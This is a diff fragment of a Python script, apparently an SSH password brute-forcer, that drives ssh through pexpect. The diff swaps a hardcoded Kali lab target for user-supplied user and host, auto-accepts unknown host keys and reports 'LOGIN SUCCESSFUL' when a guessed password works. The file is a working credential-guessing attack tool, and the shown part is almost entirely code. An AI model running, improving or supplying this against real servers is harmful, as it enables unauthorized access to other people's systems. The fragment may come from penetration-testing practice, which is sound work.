@@ -2,18 +2,26 @@ import subprocess
 import pexpect
 import sys
 
-USER = 'kali'
-HOST = '10.0.2.4'
+print("Enter user: ", end='')
+USER = input()
+print("Enter host: ", end='')
+HOST = input()
 
 def bFP(password):
     print(password)
-    ssh_command = f'ssh {USER}@{HOST} -p 22'
+    ssh_command = f'ssh -vvv {USER}@{HOST}'
     child = pexpect.spawn(ssh_command)
-    child.timeout = 30 # 30 is default
+    child.timeout = 10 # 30 second is default
     #child.logfile = sys.stdout.buffer
-    writePass = child.expect([f'{USER}@{HOST}\'s password:', pexpect.EOF, pexpect.TIMEOUT])
+    writePass = child.expect([f'can\'t be established', f'{USER}@{HOST}\'s password:', pexpect.EOF, pexpect.TIMEOUT])
     if writePass == 0:
+        child.sendline('yes');
+    elif writePass == 1:
         child.sendline(password)
+    elif writePass == 2:
+        print(child.before.decode())
+    else:
+        print('timeout!')
     isLogin = child.expect ([f'Last login', f'Permission denied, please try again.',  pexpect.EOF, pexpect.TIMEOUT])
     if isLogin == 0:
         print ('LOGIN SUCCESSFUL!!!')
